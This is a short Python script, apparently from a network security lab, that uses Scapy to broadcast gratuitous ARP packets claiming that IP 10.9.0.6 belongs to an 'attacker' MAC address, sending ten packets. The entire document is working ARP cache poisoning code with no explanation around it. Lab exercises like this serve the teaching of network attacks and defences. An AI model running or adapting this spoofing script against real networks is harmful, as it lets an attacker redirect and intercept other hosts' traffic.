#!/usr/bin/env python3
from scapy.all import *

spoofed_ip = "10.9.0.6"
attacker_mac = "02:42:0a:09:00:69"

packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
         ARP(op=1,
             hwsrc=attacker_mac,
             psrc=spoofed_ip,
             pdst=spoofed_ip)

# Send more packets as this scenario is less reliable
for i in range(10):
    sendp(packet)
    time.sleep(0.2)

print(f"Sent gratuitous ARPs to empty cache: {spoofed_ip} at {attacker_mac}")
